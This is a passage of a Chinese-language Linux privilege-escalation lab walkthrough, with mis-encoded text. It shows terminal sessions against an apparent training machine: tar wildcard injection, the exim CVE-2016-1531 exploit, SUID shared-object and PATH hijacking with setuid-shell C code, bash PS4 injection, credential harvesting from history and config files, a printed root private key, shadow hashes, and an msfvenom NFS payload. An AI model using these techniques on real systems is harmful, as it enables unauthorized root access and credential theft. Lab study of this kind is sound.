[194/194]\n\nèµ‹äºˆæ‰§è¡Œæƒé™\nuser@debian:~$ chmod +x /home/user/shell.elf\n\nåœ¨home&#x2F;userä¸‹ï¼Œæ–°å»ºä¸¤ä¸ªæ–‡ä»¶\nuser@debian:~$ touch /home/user/--checkpoint=1\nuser@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf\n\nä¹‹åï¼Œç­‰å¾…ä½œä¸šæ‰§è¡Œï¼Œå¾—åˆ°åå¼¹shell\nè¿™é‡Œï¼Œç®€å•è§£é‡Šä¸€ä¸‹ï¼Œä½œä¸šä¼šæ‰§è¡Œtarå‘½ä»¤ï¼Œæˆ‘ä»¬åœ¨ç›®å½•ä¸‹æ–°å»ºä¸¤ä¸ªæ–‡ä»¶ï¼Œå°†å‘½åæ”¹ä¸ºtarå¯æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šæŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶çš„åç§°å½“åšå‘½ä»¤æ¥æ‰§è¡Œï¼Œè€Œä¸æ˜¯ä½œä¸ºæ–‡ä»¶ã€‚\nSUIDsuidå³set user idï¼Œæ˜¯ä¸€ç§æˆäºˆæ–‡ä»¶çš„æƒé™ç±»å‹ï¼Œå®ƒå…è®¸ç”¨æˆ·ä½¿ç”¨è€…ä»¥æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™æ¥æ‰§è¡Œæ–‡ä»¶ã€‚éœ€è¦è¿™ç§ç‰¹æ®Šæƒé™çš„åœºæ™¯åœ¨Linuxä¸‹å¾ˆå¸¸è§ã€‚\nä½¿ç”¨find / -perm -4000 2&gt;/dev/null å³å¯è·å¾—æ‰€æœ‰suidå¯æ‰§è¡Œæ–‡ä»¶\nuser@debian:~$ find / -perm -4000 2&gt;/dev/null \n/usr/bin/chsh\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/bin/sudoedit\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/local/bin/suid-so\n/usr/local/bin/suid-env\n/usr/local/bin/suid-env2\n/usr/sbin/exim-4.84-3\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/pt_chown\n/bin/ping6\n/bin/ping\n/bin/mount\n/bin/su\n/bin/umount\n/tmp/rootbash\n/sbin/mount.nfs\nuser@debian:~$\n\nå·²çŸ¥æ¼æ´åœ¨ä¸Šé¢çš„æŸ¥è¯¢ä¸­å¯ä»¥çœ‹åˆ°/usr/sbin/exim-4.84-3ï¼Œåœ¨Googleï¼ŒGitHubï¼Œexploit-dbæŸ¥è¯¢æ­¤ç‰ˆæœ¬æœ‰æ— æ¼æ´ã€‚æŸ¥è¯¢å¾—åˆ°å­˜åœ¨ CVE-2016-1531æ¼æ´ï¼Œåˆ©ç”¨ç°æˆexpè¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚\nuser@debian:~$ /home/user/tools/suid/exim/cve-2016-1531.sh\n[ CVE-2016-1531 local root exploit\nsh-4.1# id\nuid=0(root) gid=1000(user) groups=0(root)\n\nå…±äº«å¯¹è±¡æ³¨å…¥/usr/local/bin/suid-so SUID å¯æ‰§è¡Œæ–‡ä»¶å®¹æ˜“å—åˆ°å…±äº«å¯¹è±¡æ³¨å…¥çš„æ”»å‡»ã€‚\nuser@debian:~$ /usr/local/bin/suid-so              //æ‰§è¡Œæ­¤æ–‡ä»¶ï¼Œä¼šå‡ºç°è¿›åº¦æ¡\nCalculating something, please wait...\n[=====================================================================&gt;] 99 %\nDone.\nuser@debian:~$ strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE &quot;open|access|no such file&quot; //åœ¨æ–‡ä»¶ä¸Šè¿è¡Œ strace å¹¶åœ¨è¾“å‡ºä¸­æœç´¢æ‰“å¼€/è®¿é—®è°ƒç”¨å’Œâ€œæ²¡æœ‰è¿™æ ·çš„æ–‡ä»¶â€é”™è¯¯\naccess(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)\naccess(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)\naccess(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)\nopen(&quot;/etc/ld.so.cache&quot;, O_RDONLY)      = 3\naccess(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)\nopen(&quot;/lib/libdl.so.2&quot;, O_RDONLY)       = 3\naccess(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)\nopen(&quot;/usr/lib/libstdc++.so.6&quot;, O_RDONLY) = 3\naccess(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)\nopen(&quot;/lib/libm.so.6&quot;, O_RDONLY)        = 3\naccess(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)\nopen(&quot;/lib/libgcc_s.so.1&quot;, O_RDONLY)    = 3\naccess(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)\nopen(&quot;/lib/libc.so.6&quot;, O_RDONLY)        = 3\nopen(&quot;/home/user/.config/libcalc.so&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)  //æœ€åä¸€è¡Œï¼Œå¯æ‰§è¡Œæ–‡ä»¶è¯•å›¾åœ¨æˆ‘ä»¬çš„ä¸»ç›®å½•ä¸­åŠ è½½ /home/user/.config/libcalc.so å…±äº«å¯¹è±¡ï¼Œä½†æ‰¾ä¸åˆ°ã€‚\nuser@debian:~$ mkdir /home/user/.config                    //ä¸º libcalc.so æ–‡ä»¶åˆ›å»º .config ç›®å½•\nuser@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c   //å°†/home/user/tools/suid/libcalc.cç¼–è¯‘åˆ° suid-so å¯æ‰§è¡Œæ–‡ä»¶æŸ¥æ‰¾å®ƒçš„ä½ç½®çš„å…±äº«å¯¹è±¡ä¸­\nuser@debian:~$ /usr/local/bin/suid-so           //å†æ¬¡æ‰§è¡Œ suid-so å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ³¨æ„è¿™æ¬¡æˆ‘ä»¬å¾—åˆ°çš„ä¸æ˜¯è¿›åº¦æ¡ï¼Œè€Œæ˜¯ root shell\nCalculating something, please wait...\nbash-4.1# id\nuid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\nbash-4.1# \n\nlibcalc.c:\nbash-4.1# cat /home/user/tools/suid/libcalc.c\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstatic void inject() __attribute__((constructor));\n\nvoid inject() &#123;\n    setuid(0);\n    system(&quot;/bin/bash -p&quot;);\n&#125;\n\nç¯å¢ƒå˜é‡/usr/local/bin/suid-env å¯æ‰§è¡Œæ–‡ä»¶å¯ä»¥è¢«åˆ©ç”¨ï¼Œå› ä¸ºå®ƒç»§æ‰¿äº†ç”¨æˆ·çš„ PATH ç¯å¢ƒå˜é‡å¹¶å°è¯•åœ¨ä¸æŒ‡å®šç»å¯¹è·¯å¾„çš„æƒ…å†µä¸‹æ‰§è¡Œç¨‹åºã€‚\nuser@debian:~$ /usr/local/bin/suid-env          //æ‰§è¡Œæ–‡ä»¶ï¼Œå‘ç°æ­£åœ¨å°è¯•å¯åŠ¨Apache2æœåŠ¡\n[....] Starting web server: apache2httpd (pid 1625) already running\n. ok \nuser@debian:~$ strings /usr/local/bin/suid-env    //åœ¨æ–‡ä»¶ä¸Šè¿è¡Œå­—ç¬¦ä¸²ä»¥æŸ¥æ‰¾å¯æ‰“å°å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼š\n/lib64/ld-linux-x86-64.so.2\n5q;Xq\n__gmon_start__\nlibc.so.6\nsetresgid\nsetresuid\nsystem\n__libc_start_main\nGLIBC_2.2.5\nfff.\nfffff.\nl$ L\nt$(L\n|$0H\nservice apache2 start  //è¿™ä¸€è¡Œè¡¨æ˜æ­£åœ¨è°ƒç”¨æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶ä»¥å¯åŠ¨ç½‘ç»œæœåŠ¡å™¨ï¼Œä½†æ˜¯æœªä½¿ç”¨å¯æ‰§è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼ˆ/usr/sbin/serviceï¼‰ã€‚\nuser@debian:~$ gcc -o service /home/user/tools/suid/service.c  //ç¼–è¯‘å‡†å¤‡å¥½çš„serviceæ–‡ä»¶\nuser@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env //å°†å½“å‰ç›®å½•ï¼ˆæˆ–æ–°æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶æ‰€åœ¨çš„ä½ç½®ï¼‰æ·»åŠ åˆ° PATH å˜é‡ï¼Œå¹¶è¿è¡Œ suid-envexecutable\nroot@debian:~# id                                   //å¾—åˆ°rootæƒé™\nuid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\nservice.c:\nroot@debian:~# cat /home/user/tools/suid/service.c \nint main() &#123;\n    setuid(0);\n    system(&quot;/bin/bash -p&quot;);\n&#125;\n\næ»¥ç”¨shellbash&lt;4.2-048åœ¨ Bash ç‰ˆæœ¬ &lt;4.2-048 ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ç±»ä¼¼äºæ–‡ä»¶è·¯å¾„çš„åç§°å®šä¹‰ shell å‡½æ•°ï¼Œç„¶åå¯¼å‡ºè¿™äº›å‡½æ•°ï¼Œä»¥ä¾¿ä½¿ç”¨å®ƒä»¬è€Œä¸æ˜¯è¯¥æ–‡ä»¶è·¯å¾„ä¸­çš„ä»»ä½•å®é™…å¯æ‰§è¡Œæ–‡ä»¶ã€‚\nuser@debian:~$ /bin/bash --version                     //è·å–bashç‰ˆæœ¬\nGNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)\nCopyright (C) 2009 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;\n\nThis is free software; you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\nuser@debian:~$ function /usr/sbin/service &#123; /bin/bash -p; &#125;     \n//åˆ›å»ºä¸€ä¸ªåä¸ºâ€œ/usr/sbin/serviceâ€çš„ Bash å‡½æ•°ï¼Œå®ƒæ‰§è¡Œä¸€ä¸ªæ–°çš„ Bash shellï¼ˆä½¿ç”¨ -p ä»¥ä¿ç•™æƒé™ï¼‰å¹¶å¯¼å‡ºè¯¥å‡½æ•°\nuser@debian:~$ export -f /usr/sbin/service \nuser@debian:~$ /usr/local/bin/suid-env2 //è¿è¡Œå¾—åˆ°root shell \nroot@debian:~# id\nuid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\nroot@debian:~# \n\nbash&lt;4.4åœ¨è°ƒè¯•æ¨¡å¼ä¸‹ï¼ŒBash ä½¿ç”¨ç¯å¢ƒå˜é‡ PS4 æ¥æ˜¾ç¤ºè°ƒè¯•è¯­å¥çš„é¢å¤–æç¤ºã€‚\nuser@debian:~$ env -i SHELLOPTS=xtrace PS4=&#39;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#39; /usr/local/bin/suid-env2\n //åœ¨å¯ç”¨ bash è°ƒè¯•çš„æƒ…å†µä¸‹è¿è¡Œ /usr/local/bin/suid-env2 å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶å°† PS4 å˜é‡è®¾ç½®ä¸ºåˆ›å»º SUID ç‰ˆæœ¬ /bin/bash çš„åµŒå…¥å¼å‘½ä»¤\n \n/usr/sbin/service apache2 start\nbasename /usr/sbin/service\nVERSION=&#39;service ver. 0.91-ubuntu1&#39;\nbasename /usr/sbin/service\nUSAGE=&#39;Usage: service &lt; option &gt; | --status-all | [ service_name [ command | --full-restart ] ]&#39;\nSERVICE=\nACTION=\nSERVICEDIR=/etc/init.d\nOPTIONS=\n&#39;[&#39; 2 -eq 0 &#39;]&#39;\ncd /\n&#39;[&#39; 2 -gt 0 &#39;]&#39;\ncase &quot;$&#123;1&#125;&quot; in\n&#39;[&#39; -z &#39;&#39; -a 2 -eq 1 -a apache2 = --status-all &#39;]&#39;\n&#39;[&#39; 2 -eq 2 -a start = --full-restart &#39;]&#39;\n&#39;[&#39; -z &#39;&#39; &#39;]&#39;\nSERVICE=apache2\nshift\n&#39;[&#39; 1 -gt 0 &#39;]&#39;\ncase &quot;$&#123;1&#125;&quot; in\n&#39;[&#39; -z apache2 -a 1 -eq 1 -a start = --status-all &#39;]&#39;\n&#39;[&#39; 1 -eq 2 -a &#39;&#39; = --full-restart &#39;]&#39;\n&#39;[&#39; -z apache2 &#39;]&#39;\n&#39;[&#39; -z &#39;&#39; &#39;]&#39;\nACTION=start\nshift\n&#39;[&#39; 0 -gt 0 &#39;]&#39;\n&#39;[&#39; -r /etc/init/apache2.conf &#39;]&#39;\n&#39;[&#39; -x /etc/init.d/apache2 &#39;]&#39;\nexec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start\nStarting web server: apache2httpd (pid 1625) already running\n.\nuser@debian:~$ \nuser@debian:~$ /tmp/rootbash -p      //ä½¿ç”¨ -p è¿è¡Œ /tmp/rootbash å¯æ‰§è¡Œæ–‡ä»¶ä»¥è·å¾—ä»¥ root æƒé™è¿è¡Œçš„ shell\n\nrootbash-4.1# id\nuid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\nå¯†ç ã€ç§˜é’¥å†å²æ–‡ä»¶å¦‚æœç”¨æˆ·ä¸å°å¿ƒåœ¨å‘½ä»¤è¡Œè€Œä¸æ˜¯åœ¨å¯†ç æç¤ºä¸­è¾“å…¥å¯†ç ï¼Œåˆ™å¯èƒ½ä¼šè®°å½•åœ¨å†å²æ–‡ä»¶ä¸­ã€‚\ncat ~/.*history    //æŸ¥çœ‹user homeä¸‹æ‰€æœ‰éšè—å†å²æ–‡ä»¶çš„å†…å®¹\n\nuser@debian:~$ cat ~/.*history\nls -al\ncat .bash_history \nls -al\nmysql -h somehost.local -uroot -ppassword123  //æš´éœ²å‡ºmysqlå¯†ç \nexit\ncd /tmp\nclear\nifconfig\nnetstat -antp\nnano myvpn.ovpn \n\né…ç½®æ–‡ä»¶é…ç½®æ–‡ä»¶é€šå¸¸åŒ…å«æ˜æ–‡æˆ–å…¶ä»–å¯é€†æ ¼å¼çš„å¯†ç ã€‚\nuser@debian:~$ ls /home/user\nmyvpn.ovpn  service  tools\nuser@debian:~$ \nuser@debian:~$ cat /home/user/myvpn.ovpn   //æ³¨æ„ myvpn.ovpn é…ç½®æ–‡ä»¶çš„å­˜åœ¨ã€‚æŸ¥çœ‹æ–‡ä»¶å†…å®¹\nclient\ndev tun\nproto udp\nremote 10.10.10.10 1194\nresolv-retry infinite\nnobind\npersist-key\npersist-tun\nca ca.crt\ntls-client\nremote-cert-tls server \nauth-user-pass /etc/openvpn/auth.txt         //è¯¥æ–‡ä»¶åº”åŒ…å«å¦ä¸€ä¸ªæ–‡ä»¶çš„å¼•ç”¨\ncomp-lzo\nverb 1\nreneg-sec 0\n\n\nuser@debian:~$ cat /etc/openvpn/auth.txt      //æŸ¥çœ‹è¯¥æ–‡ä»¶\nroot\npassword123\nuser@debian:~$ su root                        //å‡­å€Ÿå¯†ç ç™»å½•åˆ°root\nPassword: \nroot@debian:/home/user# id\nuid=0(root) gid=0(root) groups=0(root)\n\nSSHç§˜é’¥æœ‰æ—¶ç”¨æˆ·ä¼šå¤‡ä»½é‡è¦æ–‡ä»¶ï¼Œä½†æ— æ³•ä½¿ç”¨æ­£ç¡®çš„æƒé™æ¥ä¿æŠ¤å®ƒä»¬ã€‚\nuser@debian:~$ ls -la /                                      //åœ¨ç³»ç»Ÿæ ¹ç›®å½•ä¸­æŸ¥æ‰¾éšè—çš„æ–‡ä»¶å’Œç›®å½•\ntotal 96\ndrwxr-xr-x 22 root root  4096 Aug 25  2019 .\ndrwxr-xr-x 22 root root  4096 Aug 25  2019 ..\ndrwxr-xr-x  2 root root  4096 Aug 25  2019 bin\ndrwxr-xr-x  3 root root  4096 May 12  2017 boot\ndrwxr-xr-x 12 root root  2820 Feb 25 08:27 dev\ndrwxr-xr-x 67 root root  4096 Feb 25 09:19 etc\ndrwxr-xr-x  3 root root  4096 May 15  2017 home\nlrwxrwxrwx  1 root root    30 May 12  2017 initrd.img -&gt; boot/initrd.img-2.6.32-5-amd64\ndrwxr-xr-x 12 root root 12288 May 14  2017 lib\nlrwxrwxrwx  1 root root     4 May 12  2017 lib64 -&gt; /lib\ndrwx------  2 root root 16384 May 12  2017 lost+found\ndrwxr-xr-x  3 root root  4096 May 12  2017 media\ndrwxr-xr-x  2 root root  4096 Jun 11  2014 mnt\ndrwxr-xr-x  2 root root  4096 May 12  2017 opt\ndr-xr-xr-x 96 root root     0 Feb 25 08:25 proc\ndrwx------  5 root root  4096 May 15  2020 root\ndrwxr-xr-x  2 root root  4096 May 13  2017 sbin\ndrwxr-xr-x  2 root root  4096 Jul 21  2010 selinux\ndrwxr-xr-x  2 root root  4096 May 12  2017 srv\ndrwxr-xr-x  2 root root  4096 Aug 25  2019 .ssh\ndrwxr-xr-x 13 root root     0 Feb 25 08:25 sys\ndrwxrwxrwt  2 root root  4096 Feb 25 09:25 tmp\ndrwxr-xr-x 11 root root  4096 May 13  2017 usr\ndrwxr-xr-x 14 root root  4096 May 13  2017 var\nlrwxrwxrwx  1 root root    27 May 12  2017 vmlinuz -&gt; boot/vmlinuz-2.6.32-5-amd64\nuser@debian:~$ ls -l /.ssh                                 //æŸ¥çœ‹.ssh\ntotal 4\n-rw-r--r-- 1 root root 1679 Aug 25  2019 root_key\nuser@debian:~$ cat /.ssh/root_key                          //è¿›ä¸€æ­¥æŸ¥çœ‹ï¼Œç¡®å®šä¸ºsshç™»å½•ç§é’¥\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm\ngLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl\np4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo\nOHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD\neV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET\nZ36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2\nNiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ\nYaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+\n5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el\nWUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7\nVDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7\n6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW\n1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K\n824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6\nWg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc\nU7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1\nRg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi\nSXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV\nd+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im\njQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa\n871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok\nX2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4\nCLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN\nWhp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4\nLnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==\n-----END RSA PRIVATE KEY-----\n\nå°†ç§é’¥å¤åˆ¶ï¼Œæ”¾å…¥æœ¬åœ°ä¸»æœºï¼Œåˆ©ç”¨ç§é’¥ç™»å½•ssh rootè´¦æˆ·\nâ”Œâ”€â”€(n3ym4rã‰¿kali)-[~]\nâ””â”€$ ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.183.54\n//è¿™é‡Œå› ä¸ºé¶æœºå¤ªè€ï¼Œéœ€è¦åšäº›é¢å¤–çš„è®¾ç½®\n\nå¼±æ–‡ä»¶å¯è¯»&#x2F;etc&#x2F;shadow&#x2F;etc&#x2F;shadow æ–‡ä»¶åŒ…å«ç”¨æˆ·çš„å¯†ç å“ˆå¸Œå€¼ï¼Œé€šå¸¸åªæœ‰ root ç”¨æˆ·å¯è¯»ï¼Œå¦‚æœæ™®é€šç”¨æˆ·ä¹Ÿèƒ½å¯¹etc&#x2F;shadow æ–‡ä»¶è¿›è¡Œè¯»å–ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½åˆ©ç”¨å¯è¯»çš„&#x2F;etc&#x2F;shadowææƒã€‚\nuser@debian:~$ ls -l /etc/shadow                     //æŸ¥çœ‹æƒé™\n-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow\nuser@debian:~$ cat /etc/shadow\nroot:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::\ndaemon:*:17298:0:99999:7:::\nbin:*:17298:0:99999:7:::\nsys:*:17298:0:99999:7:::\nsync:*:17298:0:99999:7:::\ngames:*:17298:0:99999:7:::\nman:*:17298:0:99999:7:::\nlp:*:17298:0:99999:7:::\nmail:*:17298:0:99999:7:::\nnews:*:17298:0:99999:7:::\nuucp:*:17298:0:99999:7:::\nproxy:*:17298:0:99999:7:::\nwww-data:*:17298:0:99999:7:::\nbackup:*:17298:0:99999:7:::\nlist:*:17298:0:99999:7:::\nirc:*:17298:0:99999:7:::\ngnats:*:17298:0:99999:7:::\nnobody:*:17298:0:99999:7:::\nlibuuid:!:17298:0:99999:7:::\nDebian-exim:!:17298:0:99999:7:::\nsshd:*:17298:0:99999:7:::\nuser:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::\nstatd:*:17299:0:99999:7:::\nmysql:!:18133:0:99999:7:::\nuser@debian:~$ \n\nåœ¨æ¯è¡Œçš„ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯ä¿å­˜çš„å¯†ç hash(å¦‚æœæœ‰çš„è¯)\nå¾—åˆ°hashåï¼Œä½¿ç”¨æœ¬åœ°kaliçš„johnè¿›è¡Œå¯†ç æšä¸¾ï¼Œå¾—åˆ°æ˜æ–‡å¯†ç \nå¯å†™&#x2F;etc&#x2F;shadowuser@debian:~$ mkpasswd -m sha-512 1234       //ç”Ÿæˆ1234çš„hashå€¼\n$6$BWe0nZwWFr$Ek7Oxb/HmddxaOLZKAqi0PB9b/uJ3aDF/4SlmUQ07uT/HXT2yfyP7mtOZsJzgLR/jttTD/Fwv18sOzrKE2z6K1\n\nç„¶åï¼Œç¼–è¾‘&#x2F;etc&#x2F;shadowæ–‡ä»¶ï¼Œå°†ç”Ÿæˆçš„hashæ›¿æ¢rootçš„å¯†ç ã€‚ä¹‹åï¼Œä½¿ç”¨rootç™»å½•å³å¯ã€‚\nå¯å†™&#x2F;etc&#x2F;passwd&#x2F;etc&#x2F;passwd æ–‡ä»¶åŒ…å«æœ‰å…³ç”¨æˆ·å¸æˆ·çš„ä¿¡æ¯ã€‚å®ƒæ˜¯å…¨å±€å¯è¯»çš„ï¼Œä½†é€šå¸¸åªèƒ½ç”± root ç”¨æˆ·å†™å…¥ã€‚ä»å†å²ä¸Šçœ‹ï¼Œ&#x2F;etc&#x2F;passwd æ–‡ä»¶åŒ…å«ç”¨æˆ·å¯†ç å“ˆå¸Œå€¼ï¼ŒæŸäº›ç‰ˆæœ¬çš„ Linux ä»ç„¶å…è®¸å°†å¯†ç å“ˆå¸Œå€¼å­˜å‚¨åœ¨é‚£é‡Œã€‚\nå’Œå‰é¢etc&#x2F;shadowä¸€ä¸ªé“ç†ï¼Œç”Ÿæˆhashè¿›å…¥æ–‡ä»¶æ›¿æ¢ï¼Œç™»å½•å³å¯ã€‚\nNFSç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼ˆNFSï¼‰æ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯&#x2F;æœåŠ¡å™¨åº”ç”¨ç¨‹åºï¼Œå®ƒä½¿è®¡ç®—æœºç”¨æˆ·å¯ä»¥æŸ¥çœ‹å’Œé€‰æ‹©å­˜å‚¨å’Œæ›´æ–°è¿œç¨‹è®¡ç®—æœºä¸Šçš„æ–‡ä»¶ï¼Œå°±åƒå®ƒä»¬ä½äºç”¨æˆ·è‡ªå·±çš„è®¡ç®—æœºä¸Šä¸€æ ·ã€‚\né€šè¿‡ NFS åˆ›å»ºçš„æ–‡ä»¶ç»§æ‰¿è¿œç¨‹ç”¨æˆ·çš„ IDã€‚å¦‚æœç”¨æˆ·æ˜¯ rootï¼Œå¹¶ä¸”å¯ç”¨äº† root_sqaush å‹ç¼©ï¼Œåˆ™ ID å°†æ”¹ä¸ºè®¾ç½®ä¸ºâ€œnobodyâ€ç”¨æˆ·ã€‚å¦‚æœæ²¡æœ‰å¯ç”¨ï¼Œåˆ™å…·æœ‰rootè®¿é—®æƒé™ã€‚\nRoot Squashingï¼ˆroot_sqaushï¼‰å‚æ•°é˜»æ­¢å¯¹è¿æ¥åˆ°NFSå·çš„è¿œç¨‹rootç”¨æˆ·å…·æœ‰rootè®¿é—®æƒé™ã€‚\nä¹Ÿå°±æ˜¯è¯´ï¼Œåˆ©ç”¨æ­¤æ¼æ´ï¼Œå¿…é¡»ä¸ºno_root_squash\nuser@debian:~$ cat /etc/exports                       //æŸ¥çœ‹nfså…±äº«è®¾ç½®\n# /etc/exports: the access control list for filesystems which may be exported\n#\t\tto NFS clients.  See exports(5).\n#\n# Example for NFSv2 and NFSv3:\n# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)\n#\n# Example for NFSv4:\n# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)\n# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)\n#\n\n/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)    ///tmpç›®å½•æ˜¯å¯å…±äº«çš„ï¼Œè¿œç¨‹ç”¨æˆ·å¯ä»¥æŒ‚è½½å®ƒï¼Œå¹¶ä¸”/tmpç›®å½•å…±äº«è¿˜ç¦ç”¨äº†root_squashé€‰é¡¹ï¼ˆå¯ç”¨no_root_squashé€‰é¡¹-----å³ä»£è¡¨ç¦ç”¨äº†root_squashï¼‰\n#/tmp *(rw,sync,insecure,no_subtree_check)\n\næ­¤æ—¶å›åˆ°æˆ‘ä»¬çš„æœ¬åœ°kali\nâ”Œâ”€â”€(n3ym4rã‰¿kali)-[~]\nâ””â”€$ su root                               //åˆ‡æ¢åˆ°root                                                          \nå¯†ç ï¼š \nâ”Œâ”€â”€(rootã‰¿kali)-[/home/n3ym4r]\nâ””â”€# mkdir /tmp/nfs                        //åˆ›å»ºç›®å½•\n                                                                                                                \n                                                                                                                \nâ”Œâ”€â”€(rootã‰¿kali)-[/home/n3ym4r]\nâ””â”€# mount -o rw,vers=3 10.10.183.54:/tmp /tmp/nfs          //åˆ›å»ºä¸€ä¸ªæŒ‚è½½ç‚¹å¹¶æŒ‚è½½ç›®æ ‡æœºçš„/tmp å…±äº«ç›®å½•\n\n\n                                                                                                                \nâ”Œâ”€â”€(rootã‰¿kali)-[/home/n3ym4r]\nâ””â”€# msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf  